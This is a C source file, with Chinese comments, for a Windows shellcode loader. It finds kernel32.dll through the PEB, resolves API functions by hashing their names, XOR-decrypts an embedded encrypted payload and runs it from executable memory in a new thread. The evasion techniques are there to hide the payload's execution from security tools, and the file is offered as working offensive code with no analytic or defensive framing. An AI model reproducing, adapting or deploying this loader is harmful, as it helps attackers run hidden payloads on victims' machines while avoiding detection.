#include <windows.h>
#include <stdio.h>

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING;

struct LDR_MODULE {
    LIST_ENTRY e[3];
    HMODULE base;
    void* entry;
    UINT size;
    UNICODE_STRING dllPath;
    UNICODE_STRING dllname;
};

typedef HMODULE(WINAPI* fnGetModuleHandleA)(
    LPCSTR lpModuleName
    );

typedef FARPROC(WINAPI* fnGetProcAddress)(
    HMODULE hModule,
    LPCSTR  lpProcName
    );

typedef PVOID(WINAPI* fnVirtualAlloc)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );

typedef PVOID(WINAPI* fnCreateThread)(
    LPSECURITY_ATTRIBUTES   lpThreadAttributes,
    SIZE_T                  dwStackSize,
    LPTHREAD_START_ROUTINE  lpStartAddress,
    LPVOID                  lpParameter,
    DWORD                   dwCreationFlags,
    LPDWORD                 lpThreadId
    );

typedef PVOID(WINAPI* fnWaitForSingleObject)(
    HANDLE hHandle,
    DWORD  dwMilliseconds
    );

DWORD calcMyHash(char* data) {
    DWORD hash = 0x35;
    for (int i = 0; i < strlen(data); i++) {
        hash += data[i] + (hash << 1);
    }
    return hash;
}

static DWORD calcMyHashBase(LDR_MODULE* mdll) {
    char name[64];
    size_t i = 0;

    while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) {
        name[i] = (char)mdll->dllname.Buffer[i];
        i++;
    }
    name[i] = 0;
    return calcMyHash((char*)CharLowerA(name));
}

//从内存中获取Kernel32.dll的基地址
static HMODULE getKernel32(DWORD myHash) {
    HMODULE kernel32;

    // 获取PEB结构地址（在x64位系统中的偏移量，32位不同）
    INT_PTR peb = __readgsqword(0x60);

    auto modList = 0x18; // PEB_LDR_DATA结构中模块列表偏移量
    auto modListFlink = 0x18; // LDR_DATA_TABLE_ENTRY结构中下一个模块的偏移量
    auto kernelBaseAddr = 0x10; // LDR_DATA_TABLE_ENTRY结构中映像基地址的偏移量

    // 获取PEB_LDR_DATA结构中的模块列表指针
    auto mdllist = *(INT_PTR*)(peb + modList);

    // 获取第一个模块的LDR_DATA_TABLE_ENTRY结构中的下一个模块的指针
    auto mlink = *(INT_PTR*)(mdllist + modListFlink);

    // 获取kernel32.dll的基地址
    auto krnbase = *(INT_PTR*)(mlink + kernelBaseAddr);

    auto mdl = (LDR_MODULE*)mlink;

    // 遍历模块列表，查找kernel32.dll模块
    do {
        mdl = (LDR_MODULE*)mdl->e[0].Flink; // 获取下一个模块的LDR_MODULE结构指针
        if (mdl->base != nullptr) { // 确认模块的基地址不为空
            if (calcMyHashBase(mdl) == myHash) { // 比较模块基地址的hash值是否与目标值相同，即找到了kernel32.dll
                break;
            }
        }
    } while (mlink != (INT_PTR)mdl); // 如果遍历到的模块指针等于最开始的指针，则已遍历完整个模块列表

    kernel32 = (HMODULE)mdl->base; // 将kernel32.dll模块的基地址保存在kernel32变量中
    return kernel32;
}

//列出kernel32.dll中的api函数，计算hash与传入的目标hash对比
static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
    PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
    PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
        (LPBYTE)h + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
    PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
    PWORD  fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);

    for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
        LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);

        if (calcMyHash(pFuncName) == myHash) {
            printf("successfully found! %s - %d\n", pFuncName, myHash);
            return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
        }
    }
    return nullptr;
}

unsigned char my_payload[] = { 0x8f, 0x27, 0xf7, 0x8c, 0x99, 0x9b, 0xa9, 0x73, 0x74, 0x65, 0x32, 0x25, 0x32, 0x3f, 0x26, 0x39, 0x3f, 0x3b, 0x58, 0xa1, 0x11, 0x2d, 0xf8, 0x26, 0x13, 0x27, 0xff, 0x3a, 0x71, 0x3b, 0xe2, 0x21, 0x54, 0x2d, 0xf8, 0x6, 0x23, 0x27, 0x7b, 0xdf, 0x23, 0x39, 0x24, 0x42, 0xbd, 0x2d, 0x42, 0xb4, 0xdf, 0x53, 0x15, 0x14, 0x6b, 0x5f, 0x49, 0x32, 0xb5, 0xac, 0x7e, 0x35, 0x72, 0xae, 0x96, 0x85, 0x3b, 0x32, 0x38, 0x3b, 0xff, 0x37, 0x53, 0xff, 0x31, 0x53, 0x3c, 0x69, 0xb9, 0xf8, 0xe9, 0xfb, 0x74, 0x65, 0x73, 0x3c, 0xf6, 0xaf, 0x0, 0xf, 0x21, 0x72, 0xb9, 0x23, 0xff, 0x2d, 0x6b, 0x30, 0xf8, 0x2f, 0x54, 0x21, 0x68, 0xa3, 0x8a, 0x25, 0x3c, 0x9a, 0xba, 0x35, 0xf8, 0x5b, 0xfc, 0x20, 0x68, 0xa5, 0x24, 0x42, 0xbd, 0x2d, 0x42, 0xb4, 0xdf, 0x2e, 0xb5, 0xa1, 0x64, 0x32, 0x68, 0xb2, 0x4c, 0x85, 0x6, 0x85, 0x3f, 0x6c, 0x38, 0x4c, 0x61, 0x36, 0x50, 0xa2, 0x1, 0xbd, 0x2b, 0x30, 0xf8, 0x2f, 0x50, 0x21, 0x68, 0xa3, 0xf, 0x32, 0xff, 0x69, 0x3b, 0x30, 0xf8, 0x2f, 0x68, 0x21, 0x68, 0xa3, 0x28, 0xf8, 0x70, 0xed, 0x3b, 0x75, 0xa3, 0x2e, 0x2c, 0x29, 0x31, 0x2d, 0x30, 0x29, 0x35, 0x3d, 0x32, 0x2d, 0x32, 0x35, 0x3c, 0xeb, 0x85, 0x53, 0x28, 0x21, 0x8b, 0x85, 0x2b, 0x35, 0x2a, 0x35, 0x3c, 0xe3, 0x7b, 0x9a, 0x3e, 0x8c, 0x8b, 0x9a, 0x2e, 0x3c, 0xc9, 0x6e, 0x74, 0x68, 0x69, 0x73, 0x69, 0x73, 0x74, 0x2d, 0xfe, 0xf9, 0x72, 0x6e, 0x74, 0x68, 0x28, 0xc9, 0x58, 0xf8, 0x1b, 0xe2, 0x8c, 0xa1, 0xc8, 0x9f, 0xc1, 0xca, 0x3f, 0x32, 0xd3, 0xd5, 0xe1, 0xd8, 0xee, 0x8b, 0xa6, 0x27, 0xf7, 0xac, 0x41, 0x4f, 0x6f, 0xf, 0x7e, 0xe5, 0x88, 0x94, 0x6, 0x6a, 0xcf, 0x2f, 0x7a, 0x1, 0x6, 0x19, 0x74, 0x3c, 0x32, 0xfd, 0xa9, 0x90, 0xa1, 0xb, 0x8, 0x1f, 0xa, 0x5d, 0x11, 0x1d, 0x16, 0x74 };
unsigned int my_payload_len = sizeof(my_payload);

// key for XOR decrypt
char my_secret_key[] = "sothisistest";

// decrypt deXOR function
void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

int main() {
    HMODULE mod = getKernel32(56369259);
    fnGetModuleHandleA myGetModuleHandleA = (fnGetModuleHandleA)getAPIAddr(mod, 4038080516);
    fnGetProcAddress myGetProcAddress = (fnGetProcAddress)getAPIAddr(mod, 448915681);

    HMODULE hk32 = myGetModuleHandleA("kernel32.dll");
    fnVirtualAlloc myVirtualAlloc = (fnVirtualAlloc)myGetProcAddress(hk32, "VirtualAlloc");
    fnCreateThread myCreateThread = (fnCreateThread)myGetProcAddress(hk32, "CreateThread");
    fnWaitForSingleObject myWaitForSingleObject = (fnWaitForSingleObject)myGetProcAddress(hk32, "WaitForSingleObject");

    XOR((char*)my_payload, my_payload_len, my_secret_key, sizeof(my_secret_key));

    PVOID lb = myVirtualAlloc(0, sizeof(my_payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(lb, my_payload, sizeof(my_payload));
    HANDLE th = myCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)lb, NULL, 0, NULL);
    myWaitForSingleObject(th, INFINITE);
}
